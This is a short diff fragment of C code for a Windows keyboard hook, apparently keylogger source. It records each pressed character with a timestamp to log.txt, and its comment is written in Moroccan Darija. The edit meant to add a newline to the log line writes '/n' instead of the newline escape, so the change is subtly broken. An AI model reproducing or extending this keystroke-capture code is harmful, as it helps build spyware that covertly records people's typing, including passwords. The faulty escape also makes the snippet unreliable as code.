@@ -29,7 +29,7 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
            lpSystemTime->wMilliseconds);
                     
            if (result == 1 && pwszBuff[0] >= 32){
-                fprintf(g_log, "Key pressed: %c", pwszBuff[0]);     // ykteb code tae character f log.txt
+                fprintf(g_log, "Key pressed: %c/n", pwszBuff[0]);     // ykteb code tae character f log.txt
                  
            }
            else{
